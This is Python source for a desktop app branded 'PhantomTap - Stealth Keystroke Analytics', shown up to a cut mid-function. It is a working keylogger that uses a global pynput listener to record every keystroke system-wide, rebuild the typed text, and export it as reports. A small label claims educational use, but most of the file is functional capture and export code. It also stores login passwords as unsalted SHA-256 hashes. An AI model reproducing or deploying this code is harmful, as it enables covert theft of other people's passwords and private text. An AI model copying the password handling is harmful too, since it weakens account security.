import customtkinter as ctk
from tkinter import filedialog
from datetime import datetime
import json
import os
import threading
from collections import Counter
import sqlite3
import hashlib
import tkinter.messagebox as messagebox

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("=" * 60)
    print("ERROR: pynput library not installed!")
    print("=" * 60)

# Configure CustomTkinter appearance
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# PhantomTap Brand Color
PHANTOM_GREEN = "#00FF88"
PHANTOM_GREEN_HOVER = "#00CC6A"

class DatabaseManager:
    def __init__(self, db_name="phantomtap.db"):
        self.conn = sqlite3.connect(db_name)
        self.cursor = self.conn.cursor()
        self.create_table()

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL
            )
        """)
        self.conn.commit()

    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()

    def register_user(self, username, password):
        try:
            hashed_pw = self.hash_password(password)
            self.cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
                                (username, hashed_pw))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

    def verify_login(self, username, password):
        hashed_pw = self.hash_password(password)
        self.cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
                            (username, hashed_pw))
        return self.cursor.fetchone() is not None

    def close(self):
        self.conn.close()


class KeystrokeEvent:
    def __init__(self, key: str):
        self.timestamp = datetime.now()
        self.key = key
        self.session_id = ""
        
    def get_formatted_time(self):
        return self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
    
    def get_time_for_display(self):
        return self.timestamp.strftime("%H:%M:%S")

class SimpleKeylogger:
    def __init__(self, buffer_size=1000):
        self.buffer = []
        self.buffer_size = buffer_size
        self.is_logging = False
        self.listener = None
        self.session_name = ""
        self.session_id = ""
        self.total_keys = 0
        self.session_start = None
        self.words_typed = 0
        self.last_key_was_space = False
        self.key_frequency = Counter()
        self.hourly_activity = [0] * 24
        
    def start(self, session_name="default"):
        if not PYNPUT_AVAILABLE:
            return False
            
        self.session_name = session_name.strip() or "default"
        self.session_id = f"{self.session_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.is_logging = True
        self.buffer.clear()
        self.total_keys = 0
        self.words_typed = 0
        self.last_key_was_space = False
        self.session_start = datetime.now()
        self.key_frequency.clear()
        self.hourly_activity = [0] * 24
        
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        return True
        
    def stop(self):
        self.is_logging = False
        if self.listener:
            self.listener.stop()
    
    def clear_logs(self):
        """Clear all logs and reset counters"""
        self.buffer.clear()
        self.total_keys = 0
        self.words_typed = 0
        self.last_key_was_space = False
        self.key_frequency.clear()
        self.hourly_activity = [0] * 24
        if not self.is_logging:
            self.session_start = None
            self.session_name = ""
            self.session_id = ""
            
    def _on_press(self, key):
        if not self.is_logging:
            return
            
        try:
            key_str = self._convert_key(key)
            
            event = KeystrokeEvent(key_str)
            event.session_id = self.session_id
            self.buffer.append(event)
            self.total_keys += 1
            
            # Track key frequency
            self.key_frequency[key_str] += 1
            
            # Track hourly activity
            current_hour = datetime.now().hour
            self.hourly_activity[current_hour] += 1
            
            # Fix spacebar detection for word count
            if key_str == ' ' or key_str == '[SPACE]':
                if not self.last_key_was_space:
                    self.words_typed += 1
                self.last_key_was_space = True
            elif key_str not in ['[SHIFT]', '[CTRL]', '[ALT]', '[CAPS]', '[TAB]', '[ENTER]', '[BACKSPACE]']:
                self.last_key_was_space = False
            
            if len(self.buffer) > self.buffer_size:
                self.buffer.pop(0)
                
        except Exception:
            pass

    def _convert_key(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                if key.char == '\x08':
                    return "[BACKSPACE]"
                elif key.char == '\r' or key.char == '\n':
                    return "[ENTER]"
                elif key.char == '\t':
                    return "[TAB]"
                elif key.char == ' ':
                    return "[SPACE]"
                else:
                    return key.char
            elif hasattr(key, 'name'):
                special_keys = {
                    'space': '[SPACE]',
                    'enter': '[ENTER]',
                    'backspace': '[BACKSPACE]',
                    'tab': '[TAB]',
                    'shift': '[SHIFT]',
                    'ctrl': '[CTRL]',
                    'alt': '[ALT]',
                    'caps_lock': '[CAPS]',
                    'esc': '[ESC]',
                    'delete': '[DEL]',
                    'home': '[HOME]',
                    'end': '[END]',
                    'page_up': '[PGUP]',
                    'page_down': '[PGDN]',
                    'insert': '[INS]'
                }
                return special_keys.get(key.name, f"[{key.name.upper()}]")
            else:
                return str(key)
        except:
            return "[UNKNOWN]"

    def get_statistics(self):
        stats = {
            'total_keys': self.total_keys,
            'session_start': self.session_start,
            'session_name': self.session_name,
            'session_id': self.session_id,
            'words_typed': self.words_typed,
            'key_frequency': dict(self.key_frequency.most_common(10)),
            'hourly_activity': self.hourly_activity
        }
        
        if self.session_start:
            duration = datetime.now() - self.session_start
            stats['session_duration'] = str(duration).split('.')[0]
            
            minutes = duration.total_seconds() / 60
            if minutes > 0:
                stats['keys_per_minute'] = round(self.total_keys / minutes, 1)
                stats['words_per_minute'] = round(self.words_typed / minutes, 1)
            else:
                stats['keys_per_minute'] = 0
                stats['words_per_minute'] = 0
        
        return stats

    def get_typing_accuracy(self):
        if not self.buffer:
            return 0
        backspace_count = sum(1 for event in self.buffer if event.key == '[BACKSPACE]')
        if self.total_keys == 0:
            return 100
        accuracy = max(0, 100 - (backspace_count / self.total_keys * 100))
        return round(accuracy, 1)

    def save_to_json(self, filename):
        """Save to JSON with readable structure"""
        try:
            reconstructed_text = self._reconstruct_text()
            
            data = {
                "session_info": {
                    "name": self.session_name,
                    "id": self.session_id,
                    "start_time": self.session_start.isoformat() if self.session_start else "",
                    "saved_at": datetime.now().isoformat(),
                    "total_keys": self.total_keys,
                    "words_typed": self.words_typed,
                    "duration": str(datetime.now() - self.session_start).split('.')[0] if self.session_start else "0:00",
                    "typing_accuracy": self.get_typing_accuracy()
                },
                "keystrokes": [
                    {
                        "timestamp": event.timestamp.isoformat(),
                        "time_display": event.timestamp.strftime("%H:%M:%S"),
                        "key": event.key,
                        "key_display": self._get_key_display(event.key)
                    }
                    for event in self.buffer
                ],
                "reconstructed_text": reconstructed_text,
                "statistics": self.get_statistics(),
                "key_frequency": dict(self.key_frequency.most_common(20))
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"JSON save error: {e}")
            return False

    def _get_key_display(self, key):
        """Get human-readable display for keys"""
        if key == '[SPACE]':
            return "[SPACE]"
        elif key == '[ENTER]':
            return "[ENTER]"
        elif key == '[TAB]':
            return "[TAB]"
        elif key == '[BACKSPACE]':
            return "[BACKSPACE]"
        elif key.startswith('[') and key.endswith(']'):
            return key
        else:
            return key

    def _reconstruct_text(self):
        """Reconstruct readable text from keystrokes"""
        lines = []
        current_line = []
        
        for event in self.buffer:
            key = event.key
            
            if key == '[ENTER]':
                lines.append(''.join(current_line))
                current_line = []
            elif key == '[TAB]':
                current_line.append('\t')
            elif key == '[BACKSPACE]':
                if current_line:
                    current_line.pop()
            elif key == '[SPACE]':
                current_line.append(' ')
            elif key.startswith('[') and key.endswith(']'):
                current_line.append(f"[{key[1:-1]}]")
            else:
                current_line.append(key)
        
        if current_line:
            lines.append(''.join(current_line))
        
        return lines

    def save_to_txt(self, filename):
        """Save to TXT with readable format"""
        try:
            reconstructed_lines = self._reconstruct_text()
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("╔" + "═" * 58 + "╗\n")
                f.write("║           KEYLOGGER PRO - SESSION REPORT           ║\n")
                f.write("╚" + "═" * 58 + "╝\n\n")
                
                f.write("📋 SESSION INFORMATION\n")
                f.write("─" * 60 + "\n")
                f.write(f"Session Name:    {self.session_name}\n")
                f.write(f"Session ID:      {self.session_id}\n")
                f.write(f"Started:         {self.session_start.strftime('%Y-%m-%d %H:%M:%S') if self.session_start else 'N/A'}\n")
                f.write(f"Saved:           {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Keys:      {self.total_keys}\n")
                f.write(f"Words Typed:     {self.words_typed}\n")
                f.write(f"Accuracy:        {self.get_typing_accuracy()}%\n")
                
                if self.session_start:
                    duration = datetime.now() - self.session_start
                    hours, remainder = divmod(int(duration.total_seconds()), 3600)
                    minutes, seconds = divmod(remainder, 60)
                    f.write(f"Duration:        {hours:02d}:{minutes:02d}:{seconds:02d}\n")
                
                f.write("\n" + "╔" + "═" * 58 + "╗\n")
                f.write("║               KEYSTROKE LOG - RAW DATA               ║\n")
                f.write("╚" + "═" * 58 + "╝\n\n")
                
                for i, event in enumerate(self.buffer, 1):
                    time_str = event.timestamp.strftime("%H:%M:%S")
                    key_display = self._get_key_display(event.key)
                    
                    if key_display == '[ENTER]':
                        f.write(f"{i:4d}. [{time_str}] {key_display}\n")
                    else:
                        f.write(f"{i:4d}. [{time_str}] {key_display}\n")
                
                f.write("\n" + "╔" + "═" * 58 + "╗\n")
                f.write("║           READABLE TEXT RECONSTRUCTION           ║\n")
                f.write("╚" + "═" * 58 + "╝\n\n")
                
                if reconstructed_lines:
                    f.write("Here's what was typed:\n")
                    f.write("─" * 60 + "\n")
                    
                    for i, line in enumerate(reconstructed_lines, 1):
                        if line.strip():
                            line_display = line.replace('\t', '→')
                            f.write(f"Line {i}: {line_display}\n")
                    
                    f.write("\nFull reconstructed text:\n")
                    f.write("─" * 60 + "\n")
                    f.write(''.join(reconstructed_lines))
                    f.write("\n")
                else:
                    f.write("No readable text captured.\n")
                
                f.write("\n" + "╔" + "═" * 58 + "╗\n")
                f.write("║               PERFORMANCE SUMMARY               ║\n")
                f.write("╚" + "═" * 58 + "╝\n\n")
                
                stats = self.get_statistics()
                kpm = stats.get('keys_per_minute', 0)
                wpm = stats.get('words_per_minute', 0)
                
                f.write(f"Typing Speed:    {kpm:.1f} KPM (Keys Per Minute)\n")
                f.write(f"                 {wpm:.1f} WPM (Words Per Minute)\n")
                f.write(f"Character Count: {self.total_keys}\n")
                f.write(f"Word Count:      {self.words_typed}\n")
                f.write(f"Accuracy:        {self.get_typing_accuracy()}%\n")
                
                # Quality assessment
                if kpm > 40:
                    quality = "🚀 Excellent"
                elif kpm > 20:
                    quality = "👍 Good"
                elif kpm > 10:
                    quality = "⚡ Average"
                else:
                    quality = "🐢 Slow"
                
                f.write(f"Session Quality: {quality}\n")
                
                f.write("\n" + "╔" + "═" * 58 + "╗\n")
                f.write("║                 TOP 10 KEY FREQUENCY                 ║\n")
                f.write("╚" + "═" * 58 + "╝\n\n")
                
                for key, count in self.key_frequency.most_common(10):
                    bar = "█" * min(int(count / max(1, max(self.key_frequency.values())) * 20), 20)
                    f.write(f"{key:15} : {count:4d} {bar}\n")
                
                f.write("\n" + "═" * 60 + "\n")
                f.write("END OF REPORT\n")
                f.write("═" * 60 + "\n")
                
            return True
        except Exception as e:
            print(f"TXT save error: {e}")
            return False

    def save_to_csv(self, filename):
        """Save to CSV with readable columns"""
        try:
            import csv
            reconstructed_lines = self._reconstruct_text()
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                
                writer.writerow(["KEYLOGGER PRO - SESSION REPORT"])
                writer.writerow([])
                writer.writerow(["SESSION INFORMATION"])
                writer.writerow(["Session Name", self.session_name])
                writer.writerow(["Session ID", self.session_id])
                writer.writerow(["Started", self.session_start.strftime('%Y-%m-%d %H:%M:%S') if self.session_start else "N/A"])
                writer.writerow(["Saved", datetime.now().strftime('%Y-%m-%d %H:%M:%S')])
                writer.writerow(["Total Keys", self.total_keys])
                writer.writerow(["Words Typed", self.words_typed])
                writer.writerow(["Typing Accuracy", f"{self.get_typing_accuracy()}%"])
                writer.writerow([])
                
                writer.writerow(["KEYSTROKE LOG"])
                writer.writerow(["Index", "Timestamp", "Key", "Key Display", "Key Type"])
                
                for i, event in enumerate(self.buffer, 1):
                    time_str = event.timestamp.strftime("%H:%M:%S.%f")[:-3]
                    key = event.key
                    key_display = self._get_key_display(key)
                    
                    if key == '[SPACE]':
                        key_type = "Space"
                    elif key == '[ENTER]':
                        key_type = "Enter"
                    elif key == '[TAB]':
                        key_type = "Tab"
                    elif key == '[BACKSPACE]':
                        key_type = "Backspace"
                    elif key.startswith('[') and key.endswith(']'):
                        key_type = "Special"
                    else:
                        key_type = "Character"
                    
                    writer.writerow([i, time_str, key, key_display, key_type])
                
                writer.writerow([])
                writer.writerow(["RECONSTRUCTED TEXT"])
                if reconstructed_lines:
                    for i, line in enumerate(reconstructed_lines, 1):
                        if line.strip():
                            writer.writerow([f"Line {i}", line])
                else:
                    writer.writerow(["No readable text captured"])
                
                writer.writerow([])
                writer.writerow(["STATISTICS"])
                
                stats = self.get_statistics()
                duration = stats.get('session_duration', '0:00')
                kpm = stats.get('keys_per_minute', 0)
                wpm = stats.get('words_per_minute', 0)
                
                writer.writerow(["Session Duration", duration])
                writer.writerow(["Typing Speed (KPM)", f"{kpm:.1f}"])
                writer.writerow(["Typing Speed (WPM)", f"{wpm:.1f}"])
                writer.writerow(["Characters per second", f"{kpm/60:.2f}"])
                writer.writerow(["Accuracy", f"{self.get_typing_accuracy()}%"])
                
                writer.writerow([])
                writer.writerow(["KEY FREQUENCY (Top 10)"])
                writer.writerow(["Key", "Count"])
                for key, count in self.key_frequency.most_common(10):
                    writer.writerow([key, count])
                
            return True
        except Exception as e:
            print(f"CSV save error: {e}")
            return False

class PhantomTapGUI(ctk.CTkToplevel):
    def __init__(self, username, auth_app):
        super().__init__()
        
        self.username = username
        self.auth_app = auth_app
        self.title("PhantomTap - Stealth Keystroke Analytics")
        self.geometry("1600x900")
        
        self.transient(auth_app)
        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.colors = {
            'primary': '#00bcd4',
            'primary_dark': '#00838f',
            'primary_light': '#4dd0e1',
            'secondary': '#4caf50',
            'secondary_dark': '#2e7d32',
            'secondary_light': '#80e27e',
            'accent': '#00bfa5',
            'danger': '#ff5252',
            'warning': '#ffb74d',
            'info': '#64b5f6',
            'bg_dark': '#0a1929',
            'bg_card': '#132f4c',
            'bg_hover': '#1a3b5c',
            'text_primary': '#ffffff',
            'text_secondary': '#b2ebf2',
            'border': '#1e4b6e',
            'success': '#00e676',
            'gradient_start': '#006064',
            'gradient_end': '#004d40'
        }
        
        self.update_idletasks()
        width = 1600
        height = 900
        x = (self.winfo_screenwidth() // 2) - (width // 2)
        y = (self.winfo_screenheight() // 2) - (height // 2)
        self.geometry(f'{width}x{height}+{x}+{y}')
        
        self.keylogger = SimpleKeylogger()
        self.update_timer = None
        
        self._create_widgets()
        self._start_updates()
        
    def on_closing(self):
        if self.keylogger.is_logging:
            self.keylogger.stop()
        self.destroy()
        self.auth_app.deiconify()
        
    def _create_widgets(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        self.sidebar = ctk.CTkFrame(
            self, 
            width=360,
            corner_radius=0, 
            fg_color=self.colors['bg_card'],
            border_width=0
        )
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(6, weight=1)
        
        logo_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent", height=140)
        logo_frame.pack(pady=(30, 20), padx=20, fill="x")
        logo_frame.pack_propagate(False)
        
        title_frame = ctk.CTkFrame(logo_frame, fg_color="transparent")
        title_frame.pack(expand=True)
        
        logo_container = ctk.CTkFrame(
            title_frame, 
            fg_color=self.colors['primary_dark'],
            corner_radius=25,
            width=70,
            height=70
        )
        logo_container.pack(pady=(0, 15))
        logo_container.pack_propagate(False)
        
        ctk.CTkLabel(
            logo_container,
            text="👻",
            font=ctk.CTkFont(size=40)
        ).pack(expand=True)
        
        ctk.CTkLabel(
            title_frame,
            text="PHANTOM",
            font=ctk.CTkFont(size=28, weight="bold"),
            text_color=self.colors['primary_light']
        ).pack()
        
        ctk.CTkLabel(
            title_frame,
            text="TAP",
            font=ctk.CTkFont(size=32, weight="bold"),
            text_color=self.colors['secondary_light']
        ).pack()
        
        ctk.CTkLabel(
            title_frame,
            text="Stealth Keystroke Analytics",
            font=ctk.CTkFont(size=11),
            text_color=self.colors['text_secondary']
        ).pack(pady=(5, 0))
        
        version_frame = ctk.CTkFrame(
            logo_frame, 
            fg_color=self.colors['gradient_start'], 
            corner_radius=15, 
            height=24
        )
        version_frame.pack(pady=(15, 0))
        version_frame.pack_propagate(False)
        
        ctk.CTkLabel(
            version_frame,
            text="v2.0.0 • PROFESSIONAL",
            font=ctk.CTkFont(size=10, weight="bold"),
            text_color=self.colors['secondary_light']
        ).pack(padx=15, pady=3)
        
        separator = ctk.CTkFrame(self.sidebar, height=2, fg_color=self.colors['border'])
        separator.pack(fill="x", padx=20, pady=10)
        
        config_card = ctk.CTkFrame(
            self.sidebar, 
            fg_color=self.colors['bg_hover'], 
            corner_radius=15,
            border_width=1,
            border_color=self.colors['border']
        )
        config_card.pack(pady=10, padx=20, fill="x")
        
        ctk.CTkLabel(
            config_card,
            text="SESSION CONFIG",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=self.colors['primary_light']
        ).pack(pady=(15, 10), padx=15, anchor="w")
        
        name_frame = ctk.CTkFrame(config_card, fg_color="transparent")
        name_frame.pack(fill="x", padx=15, pady=5)
        
        ctk.CTkLabel(
            name_frame,
            text="🔮",
            font=ctk.CTkFont(size=14)
        ).pack(side="left", padx=(0, 10))
        
        ctk.CTkLabel(
            name_frame,
            text="Session Name:",
            font=ctk.CTkFont(size=11),
            text_color=self.colors['text_secondary']
        ).pack(side="left")
        
        self.session_entry = ctk.CTkEntry(
            config_card,
            placeholder_text="Enter session name...",
            height=38,
            border_width=1,
            border_color=self.colors['border'],
            fg_color=self.colors['bg_card']
        )
        self.session_entry.pack(padx=15, pady=(0, 15), fill="x")
        self.session_entry.insert(0, f"Session_{datetime.now().strftime('%H%M')}")
        
        status_card = ctk.CTkFrame(
            self.sidebar, 
            fg_color=self.colors['bg_hover'], 
            corner_radius=15,
            border_width=1,
            border_color=self.colors['border']
        )
        status_card.pack(pady=10, padx=20, fill="x")
        
        ctk.CTkLabel(
            status_card,
            text="SYSTEM STATUS",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=self.colors['secondary_light']
        ).pack(pady=(15, 10), padx=15, anchor="w")
        
        status_container = ctk.CTkFrame(status_card, fg_color="transparent")
        status_container.pack(fill="x", padx=15, pady=(0, 15))
        
        self.status_indicator = ctk.CTkLabel(
            status_container,
            text="●",
            font=ctk.CTkFont(size=20),
            text_color="gray"
        )
        self.status_indicator.pack(side="left", padx=(0, 10))
        
        self.status_label = ctk.CTkLabel(
            status_container,
            text="STANDBY",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="gray"
        )
        self.status_label.pack(side="left")
        
        counter_frame = ctk.CTkFrame(status_container, fg_color="transparent")
        counter_frame.pack(side="right")
        
        ctk.CTkLabel(
            counter_frame,
            text="⌨️",
            font=ctk.CTkFont(size=12)
        ).pack(side="left", padx=(0, 5))
        
        self.count_var = ctk.CTkLabel(
            counter_frame,
            text="0",
            font=ctk.CTkFont(size=14, weight="bold"),
            text_color=self.colors['primary_light']
        )
        self.count_var.pack(side="left")
        
        control_card = ctk.CTkFrame(
            self.sidebar, 
            fg_color=self.colors['bg_hover'], 
            corner_radius=15,
            border_width=1,
            border_color=self.colors['border']
        )
        control_card.pack(pady=10, padx=20, fill="x")
        
        ctk.CTkLabel(
            control_card,
            text="CONTROL PANEL",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=self.colors['primary_light']
        ).pack(pady=(15, 10), padx=15, anchor="w")
        
        button_container = ctk.CTkFrame(control_card, fg_color="transparent")
        button_container.pack(fill="x", padx=15, pady=(0, 15))
        
        row1_frame = ctk.CTkFrame(button_container, fg_color="transparent")
        row1_frame.pack(fill="x", pady=(0, 8))
        row1_frame.grid_columnconfigure(0, weight=1)
        row1_frame.grid_columnconfigure(1, weight=1)
        
        self.start_btn = ctk.CTkButton(
            row1_frame,
            text="▶ ACTIVATE",
            command=self.start_logging,
            height=42,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color=self.colors['secondary'],
            hover_color=self.colors['secondary_dark'],
            corner_radius=8,
            border_width=0
        )
        self.start_btn.grid(row=0, column=0, padx=(0, 4), sticky="ew")
        
        self.stop_btn = ctk.CTkButton(
            row1_frame,
            text="⏹ DEACTIVATE",
            command=self.stop_logging,
            height=42,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color=self.colors['danger'],
            hover_color="#d32f2f",
            corner_radius=8,
            border_width=0,
            state="disabled"
        )
        self.stop_btn.grid(row=0, column=1, padx=(4, 0), sticky="ew")
        
        row2_frame = ctk.CTkFrame(button_container, fg_color="transparent")
        row2_frame.pack(fill="x", pady=(0, 8))
        row2_frame.grid_columnconfigure(0, weight=1)
        row2_frame.grid_columnconfigure(1, weight=1)
        
        self.clear_btn = ctk.CTkButton(
            row2_frame,
            text="🗑 CLEAR",
            command=self.clear_logs,
            height=42,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color=self.colors['warning'],
            hover_color="#f57c00",
            corner_radius=8,
            border_width=0
        )
        self.clear_btn.grid(row=0, column=0, padx=(0, 4), sticky="ew")
        
        self.export_btn = ctk.CTkButton(
            row2_frame,
            text="💾 EXPORT",
            command=self.save_log,
            height=42,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color=self.colors['primary'],
            hover_color=self.colors['primary_dark'],
            corner_radius=8,
            border_width=0
        )
        self.export_btn.grid(row=0, column=1, padx=(4, 0), sticky="ew")
        
        logout_btn = ctk.CTkButton(
            button_container,
            text="🚪 LOGOUT",
            command=self.logout,
            height=42,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color="#D32F2F",
            hover_color="#B71C1C",
            corner_radius=8,
            border_width=0
        )
        logout_btn.pack(fill="x", pady=(0, 0))
        
        disclaimer_card = ctk.CTkFrame(
            self.sidebar, 
            fg_color=self.colors['gradient_start'], 
            corner_radius=10, 
            border_width=0
        )
        disclaimer_card.pack(pady=20, padx=20, fill="x", side="bottom")
        
        ctk.CTkLabel(
            disclaimer_card,
            text="👻 PHANTOM MODE",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=self.colors['secondary_light']
        ).pack(pady=(15, 5))
        
        ctk.CTkLabel(
            disclaimer_card,
            text=f"Logged in as: {self.username}",
            font=ctk.CTkFont(size=10, weight="bold"),
            text_color=self.colors['secondary_light']
        ).pack()
        
        ctk.CTkLabel(
            disclaimer_card,
            text="Educational Use Only • Test on Own Devices",
            font=ctk.CTkFont(size=9),
            text_color=self.colors['text_secondary']
        ).pack(pady=(5, 15))
        
        self.main_content = ctk.CTkFrame(
            self, 
            fg_color=self.colors['bg_dark'],
            corner_radius=20
        )
        self.main_content.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)
        self.main_content.grid_columnconfigure(0, weight=1)
        self.main_content.grid_rowconfigure(2, weight=1)
        
        stats_container = ctk.CTkFrame(self.main_content, fg_color="transparent")
        stats_container.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        
        for i in range(5):
            stats_container.grid_columnconfigure(i, weight=1)
        
        self.stat_cards = {}
        stat_data = [
            ("Total Keys", "0", self.colors['primary_light'], "⌨️"),
            ("Words", "0", self.colors['secondary_light'], "📝"),
            ("Speed", "0 KPM", self.colors['accent'], "⚡"),
            ("Accuracy", "100%", self.colors['info'], "🎯"),
            ("Duration", "00:00", self.colors['warning'], "⏱️")
        ]
        
        for i, (title, value, color, icon) in enumerate(stat_data):
            card = ctk.CTkFrame(
                stats_container, 
                fg_color=self.colors['bg_card'], 
                corner_radius=15,
                border_width=1,
                border_color=self.colors['border']
            )
            card.grid(row=0, column=i, padx=5, sticky="ew")
            
            header = ctk.CTkFrame(card, fg_color="transparent")
            header.pack(pady=(15, 5), padx=15, fill="x")
            
            ctk.CTkLabel(
                header,
                text=icon,
                font=ctk.CTkFont(size=18)
            ).pack(side="left", padx=(0, 8))
            
            ctk.CTkLabel(
                header,
                text=title,
                font=ctk.CTkFont(size=11),
                text_color=self.colors['text_secondary']
            ).pack(side="left")
            
            value_label = ctk.CTkLabel(
                card,
                text=value,
                font=ctk.CTkFont(size=22, weight="bold"),
                text_color=color
            )
            value_label.pack(pady=(0, 15))
            
            self.stat_cards[title.lower().replace(" ", "_")] = value_label
        
        preview_container = ctk.CTkFrame(
            self.main_content,
            fg_color=self.colors['bg_hover'],
            corner_radius=15,
            border_width=1,
            border_color=self.colors['border']
        )
        preview_container.grid(row=1, column=0, padx=0, pady=10, sticky="nsew")
        preview_container.grid_columnconfigure(0, weight=1)
        preview_container.grid_rowconfigure(1, weight=1)
        
        ctk.CTkLabel(
            preview_container,
            text="📝 REAL-TIME TEXT RECONSTRUCTION",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color=self.colors['primary_light']
        ).grid(row=0, column=0, pady=(20, 10))
        
        self.preview_text = ctk.CTkTextbox(
            preview_container,
            font=ctk.CTkFont(family="Consolas", size=14),
            fg_color=self.colors['bg_card'],
            corner_radius=10,
            border_width=2,
            border_color=self.colors['border']
        )
        self.preview_text.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="nsew")
        self.preview_text.configure(state="disabled")
        
        info_bar = ctk.CTkFrame(
            self.main_content, 
            fg_color=self.colors['bg_card'], 
            corner_radius=10, 
            height=40,
            border_width=1,
            border_color=self.colors['border']
        )
        info_bar.grid(row=2, column=0, sticky="ew")
        info_bar.grid_columnconfigure(0, weight=1)
        
        self.session_info_label = ctk.CTkLabel(
            info_bar,
            text="👻 PhantomTap ready for stealth monitoring",
            font=ctk.CTkFont(size=13),
            text_color=self.colors['text_secondary']
        )
        self.session_info_label.pack(pady=10)
    
    def logout(self):
        if self.keylogger.is_logging:
            self.keylogger.stop()
        self.destroy()
        self.auth_app.deiconify()
        
    def start_logging(self):
        if not PYNPUT_AVAILABLE:
            self.show_error_dialog("Missing Dependency", "pynput library is required!\n\nPlease install it using:\npip install pynput")
            return

        session_name = self.session_entry.get().strip()
        if not session_name:
            session_name = f"Session_{datetime.now().strftime('%H%M')}"
            
        if self.keylogger.start(session_name):
            self.status_indicator.configure(text_color=self.colors['secondary_light'])
            self.status_label.configure(text="ACTIVE", text_color=self.colors['secondary_light'])
            self.start_btn.configure(state="disabled")
            self.stop_btn.configure(state="normal")
            self.export_btn.configure(state="normal")
            self.clear_btn.configure(state="normal")
            self.session_info_label.configure(
                text=f"👁️ Active Session: {self.keylogger.session_name} | ID: {self.keylogger.session_id[:20]}..."
            )
            
    def stop_logging(self):
        self.keylogger.stop()
        self.status_indicator.configure(text_color="gray")
        self.status_label.configure(text="STANDBY", text_color="gray")
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        
        stats = self.keylogger.get_statistics()
        self.show_info_dialog(
            "Monitoring Stopped",
            f"📊 Session Summary\n\n"
            f"• Total Keystrokes: {stats.get('total_keys', 0)}\n"
            f"• Words Typed: {stats.get('words_typed', 0)}\n"
            f"• Duration: {stats.get('session_duration', '0:00')}\n"
            f"• Accuracy: {self.keylogger.get_typing_accuracy()}%"
        )
    
    def clear_logs(self):
        if self.keylogger.buffer or self.keylogger.total_keys > 0:
            self.keylogger.clear_logs()
            
            self._update_display()
            self._update_preview()
            
            if not self.keylogger.is_logging:
                self.session_info_label.configure(text="👻 PhantomTap ready for stealth monitoring")
            
            self.show_info_dialog("Logs Cleared", "🗑 All logs have been cleared successfully!")
        else:
            self.show_warning_dialog("No Logs", "No logs to clear!")

    def save_log(self):
        if not self.keylogger.buffer:
            self.show_warning_dialog("No Data", "No keystrokes captured yet!")
            return

        dialog = ctk.CTkToplevel(self)
        dialog.title("Export Data")
        dialog.geometry("500x450")
        dialog.transient(self)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = self.winfo_x() + (self.winfo_width() // 2) - (500 // 2)
        y = self.winfo_y() + (self.winfo_height() // 2) - (450 // 2)
        dialog.geometry(f'500x450+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="👻 PHANTOM EXPORT",
            font=ctk.CTkFont(size=22, weight="bold"),
            text_color=self.colors['primary_light']
        ).pack(pady=30)
        
        ctk.CTkLabel(
            dialog,
            text="Select Export Format",
            font=ctk.CTkFont(size=15),
            text_color=self.colors['text_secondary']
        ).pack(pady=(0, 20))
        
        format_var = ctk.StringVar(value="txt")
        
        formats = [
            ("📄 Text Document (.txt) - Human Readable", "txt", self.colors['primary']),
            ("📊 JSON Data (.json) - Structured Format", "json", self.colors['secondary']),
            ("📈 CSV Spreadsheet (.csv) - Data Analysis", "csv", self.colors['accent'])
        ]
        
        for text, fmt, color in formats:
            radio_frame = ctk.CTkFrame(dialog, fg_color="transparent")
            radio_frame.pack(anchor='w', padx=50, pady=8, fill="x")
            
            ctk.CTkRadioButton(
                radio_frame,
                text=text,
                variable=format_var,
                value=fmt,
                font=ctk.CTkFont(size=13),
                fg_color=color
            ).pack(side="left")
        
        preview_frame = ctk.CTkFrame(dialog, fg_color=self.colors['bg_hover'], corner_radius=10)
        preview_frame.pack(pady=20, padx=50, fill="x")
        
        ctk.CTkLabel(
            preview_frame,
            text=f"📊 {self.keylogger.total_keys} keystrokes • {self.keylogger.words_typed} words",
            font=ctk.CTkFont(size=14),
            text_color=self.colors['text_secondary']
        ).pack(pady=12)
        
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(pady=20)
        
        def do_export():
            fmt = format_var.get()
            dialog.destroy()
            self._perform_export(fmt)
        
        ctk.CTkButton(
            button_frame,
            text="Export",
            command=do_export,
            width=150,
            height=45,
